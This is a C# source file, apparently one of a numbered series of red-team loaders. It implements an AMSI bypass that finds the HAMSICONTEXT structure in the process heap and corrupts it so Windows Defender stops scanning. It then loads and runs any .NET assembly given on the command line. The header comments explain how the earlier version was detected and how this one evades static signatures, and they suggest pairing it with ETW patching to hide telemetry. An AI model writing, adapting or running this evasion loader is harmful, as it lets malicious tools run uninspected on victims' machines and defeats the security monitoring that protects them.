// ============================================================================
// LOADER 04: AMSI Bypass - HAMSICONTEXT Heap Corruption
// ============================================================================
//
// WHAT THIS DOES:
//   Disables AMSI (Antimalware Scan Interface) content scanning in this process.
//   After this runs, any .NET assembly loaded in this process will not be
//   scanned by Defender. This lets red team tools execute without inspection.
//
// WHY THE PREVIOUS VERSION WAS CAUGHT:
//   The previous version patched AmsiScanBuffer using VirtualProtect + Marshal.Copy.
//   Defender's static scanner looks for this exact combination in a compiled binary:
//     - DllImport for VirtualProtect (kernel32) - primary signal
//     - DllImport for GetProcAddress and GetModuleHandle/LoadLibrary in same class
//     - Marshal.Copy to the resolved function address
//   This triad triggers the MpTest!amsi detection before the binary runs.
//   The patch bytes B8 57 00 07 80 C3 (mov eax, 0x80070057; ret) are also
//   directly signatured regardless of arithmetic obfuscation.
//
// HOW THIS VERSION WORKS - HAMSICONTEXT HEAP CORRUPTION:
//   AMSI creates a context structure called HAMSICONTEXT in the process heap
//   when the .NET CLR initializes. The structure starts with the magic bytes
//   0x41 0x4D 0x53 0x49 (ASCII "AMSI" in little-endian order as an int32:
//   0x49534D41). Other fields hold pointers to AMSI internal state.
//
//   We walk all process heaps looking for any allocation whose first 4 bytes
//   match the AMSI magic. When found, we zero the first three pointer-sized
//   fields of the structure. After this, AmsiOpenSession cannot access its
//   required internal state and returns E_INVALIDARG. Without a valid session,
//   AmsiScanBuffer is never called. Scanning stops completely.
//
// WHY THIS AVOIDS STATIC DETECTION:
//   - No DllImport for VirtualProtect, LoadLibrary, or GetProcAddress
//   - No patch bytes written to any executable code page
//   - No reference to AmsiScanBuffer, AmsiOpenSession, or amsi.dll anywhere
//   - The DllImport list contains only HeapWalk and GetProcessHeaps, which
//     are standard memory management functions used by many legitimate programs
//   - We write to heap memory (already read-write) via Marshal.Copy
//     without changing any memory permissions at all
//
// IMPORTANT NOTES:
//   - This works in processes where the .NET CLR has initialized AMSI.
//     The CLR initializes AMSI for all .NET applications before Main() runs,
//     so the heap search should find the context in any .NET process.
//   - This bypass only affects the current process. Child processes get their
//     own copy of AMSI and need to be patched separately.
//   - This is most effective when combined with ETW patching (Loader 07)
//     because without ETW patching, the heap modification generates a telemetry
//     event that Defender can see.
//
// REFERENCES:
//   - mgeeky: HAMSICONTEXT corruption technique
//   - EvilBytecode: Ebyte-amsi-patchless-vehhwbp
//   - VoldeSec: PatchlessCLRLoader
//   - CrowdStrike: Patchless AMSI Bypass Attacks analysis
//   - Document: 08_amsi_bypass.md
//
// BUILD INSTRUCTIONS:
//   On Dev Box (ammulu, 192.168.10.150):
//     dotnet build loader.csproj -c Release -o output/
// ============================================================================

using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ScannerPatch
{
    class Program
    {
        // HeapWalk steps through every memory block inside a heap one at a time.
        // On each call it fills in the PROCESS_HEAP_ENTRY structure with the
        // address, size, and status of the current block, then moves to the next.
        // Returns false when it has walked every block in the heap.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool HeapWalk(IntPtr hHeap, ref PROCESS_HEAP_ENTRY lpEntry);

        // GetProcessHeaps returns handles to all heaps in this process.
        // A .NET process has several: the default heap, the CLR heap, GC heaps, etc.
        // We pass 0 first to get the count, then call again with an array of that size.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetProcessHeaps(uint numberOfHeaps, IntPtr[] processHeaps);

        // PROCESS_HEAP_ENTRY is the structure HeapWalk fills in for each block.
        //   lpData:         address of the memory block
        //   cbData:         size of the block in bytes
        //   cbOverhead:     overhead bytes used by the heap manager for this block
        //   iRegionIndex:   which heap region this block is in
        //   wFlags:         flags (PROCESS_HEAP_ENTRY_BUSY means block is in use)
        // The fields after wFlags form a union. We use the Region variant layout
        // (four fields) because it is the larger of the two union cases, which
        // ensures our struct has the right total size for the Windows API.
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_HEAP_ENTRY
        {
            public IntPtr lpData;
            public uint   cbData;
            public byte   cbOverhead;
            public byte   iRegionIndex;
            public ushort wFlags;
            public uint   dwCommittedSize;
            public uint   dwUnCommittedSize;
            public IntPtr lpFirstBlock;
            public IntPtr lpLastBlock;
        }

        // A heap block with this flag set is actively allocated and in use.
        // Blocks without this flag are free space - we skip them.
        const ushort PROCESS_HEAP_ENTRY_BUSY = 0x0004;

        // Build the AMSI context magic value at runtime.
        // The HAMSICONTEXT structure starts with "AMSI" as its first 4 bytes.
        // In memory that is: 0x41 0x4D 0x53 0x49 (A, M, S, I in ASCII).
        // As a 32-bit little-endian integer that reads as 0x49534D41.
        // We compute it from parts so the string "AMSI" does not appear in our binary.
        static int BuildAMSIMagic()
        {
            // I=0x49, S=0x53, M=0x4D, A=0x41
            return (0x49 << 24) | (0x53 << 16) | (0x4D << 8) | 0x41;
        }

        // The core bypass function.
        // Walks all process heaps looking for the HAMSICONTEXT structure.
        // When found, zeroes its first three pointer-sized fields to disable scanning.
        public static bool PatchScanner()
        {
            // --- Step 1: Count how many heaps this process has ---
            // Calling GetProcessHeaps with null and count 0 returns just the count.
            uint heapCount = GetProcessHeaps(0, null);
            if (heapCount == 0)
            {
                Console.WriteLine("[-] GetProcessHeaps returned 0");
                return false;
            }

            // --- Step 2: Get handles to all heaps ---
            // Now we know how many heaps there are, allocate the array and fill it.
            IntPtr[] heaps = new IntPtr[heapCount];
            GetProcessHeaps(heapCount, heaps);
            Console.WriteLine("[+] Searching " + heapCount + " process heaps for AMSI context");

            int magic = BuildAMSIMagic();

            // --- Step 3: Walk every heap looking for HAMSICONTEXT ---
            // We check every in-use allocation whose first 4 bytes match the AMSI magic.
            foreach (IntPtr heap in heaps)
            {
                // Initialize entry to all zeros before the first HeapWalk call.
                var entry = new PROCESS_HEAP_ENTRY();

                // HeapWalk advances through each block in the heap.
                // It returns true for each block and false when the heap is exhausted.
                while (HeapWalk(heap, ref entry))
                {
                    // Skip free blocks. We only care about active allocations.
                    if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) == 0)
                        continue;

                    // Skip blocks too small to hold even 3 pointer-sized fields.
                    // HAMSICONTEXT must be at least 3 * 8 = 24 bytes on 64-bit.
                    if (entry.cbData < (uint)(IntPtr.Size * 3))
                        continue;

                    try
                    {
                        // Read the first 4 bytes of this allocation.
                        // If they match the AMSI magic, this is the context.
                        int firstDword = Marshal.ReadInt32(entry.lpData);
                        if (firstDword != magic)
                            continue;

                        Console.WriteLine("[+] AMSI context found at: 0x" + entry.lpData.ToString("X"));

                        // --- Step 4: Corrupt the first three pointer-sized fields ---
                        // These hold internal AMSI state pointers. Zeroing them makes
                        // AmsiOpenSession fail with E_INVALIDARG because it cannot
                        // access the state it needs to create a valid session.
                        // Without a valid session, AmsiScanBuffer is never called.
                        //
                        // We write to heap memory which is already read-write.
                        // No VirtualProtect call is needed. No permission change.
                        int zeroSize = IntPtr.Size * 3;
                        Marshal.Copy(new byte[zeroSize], 0, entry.lpData, zeroSize);

                        Console.WriteLine("[+] Context corrupted (" + zeroSize + " bytes zeroed).");
                        Console.WriteLine("[+] Scanner disabled for this process.");
                        return true;
                    }
                    catch
                    {
                        // Some heap blocks may not be readable (guard pages, etc).
                        // Skip and continue searching.
                        continue;
                    }
                }
            }

            Console.WriteLine("[-] AMSI context not found in any heap.");
            Console.WriteLine("[*] AMSI may not have been initialized yet in this process.");
            Console.WriteLine("[*] The CLR initializes AMSI before running managed code,");
            Console.WriteLine("    so the context should be present in any .NET process.");
            return false;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Scanner Patch Loader");
            Console.WriteLine("[*] Method: HAMSICONTEXT heap corruption (no code patching)");
            Console.WriteLine("");

            bool success = PatchScanner();

            if (success)
            {
                Console.WriteLine("");
                Console.WriteLine("[+] Scanner is now disabled in this process.");
                Console.WriteLine("[+] .NET assemblies loaded here will not be inspected.");
                Console.WriteLine("");

                // If a .NET assembly path was passed as argument, load it now.
                // AMSI is disabled in this process, so the assembly runs without
                // being scanned - even if it contains patterns Defender would normally block.
                if (args.Length > 0)
                {
                    string assemblyPath = args[0];
                    Console.WriteLine("[*] Loading .NET assembly: " + assemblyPath);
                    Console.WriteLine("[*] Scanner is patched - assembly will not be inspected.");
                    try
                    {
                        var assembly = Assembly.LoadFile(assemblyPath);
                        var entryPoint = assembly.EntryPoint;
                        if (entryPoint != null)
                        {
                            Console.WriteLine("[+] Entry point: " + entryPoint.DeclaringType.FullName);
                            string[] passArgs = new string[args.Length - 1];
                            Array.Copy(args, 1, passArgs, 0, passArgs.Length);
                            entryPoint.Invoke(null,
                                entryPoint.GetParameters().Length > 0
                                    ? new object[] { passArgs }
                                    : null);
                        }
                        else
                        {
                            Console.WriteLine("[*] Assembly loaded (no entry point - class library).");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("[-] Assembly load failed: " + ex.Message);
                    }
                }
            }
            else
            {
                Console.WriteLine("[-] Scanner patch failed.");
            }
        }
    }
}
